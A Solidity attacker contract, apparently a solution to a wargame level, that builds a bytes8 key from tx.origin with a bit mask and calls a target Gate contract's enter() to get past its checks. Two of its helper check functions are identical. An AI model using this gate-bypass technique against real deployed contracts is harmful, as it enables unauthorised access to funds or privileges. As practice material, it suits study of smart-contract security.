pragma solidity ^0.6.0;

interface Gate{
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateAttacker{

    Gate impl; 
    uint64 offset = 0xFFFFFFFF0000FFFF;
    bytes8 changedValue;

    constructor(address addr) public {
        impl = Gate(addr);
    }

    function getAddress() public {
        changedValue = bytes8(uint64(tx.origin) & offset);
    }

    function c1() public view returns (bool){
        return uint32(uint64(changedValue))!=uint64(changedValue);
    }

    function c2() public view returns (bool){
        return uint32(uint64(changedValue))!=uint64(changedValue);
    }

    function c3() public view returns (bool) {
        return uint32(uint64(changedValue)) == uint16(tx.origin);
    }

    function attack() public {
        impl.enter(changedValue);
    }
}